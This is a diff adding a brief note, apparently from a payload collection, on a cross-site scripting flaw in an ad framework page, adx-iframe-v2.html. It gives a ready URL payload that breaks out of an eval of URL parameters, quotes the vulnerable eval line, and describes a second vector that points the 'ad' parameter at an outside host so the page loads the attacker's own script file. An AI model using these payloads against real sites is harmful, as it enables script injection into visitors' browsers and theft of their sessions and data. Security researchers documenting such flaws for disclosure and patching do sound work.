@@ -1,0 +1,7 @@
+/adinterax/adx-iframe-v2.html?xxx=1%27;alert();//&nest=1
+
+The script first simply eval almost all param/value in the URL
+if(i>2)eval("var "+k+"='"+v+"'");
+
+But if you prefer the confort of loading your own script then just load
+/adinterax/adx-iframe-v2.html?ad=https://bgtian.life and put your js in a file named ad-iframe.js
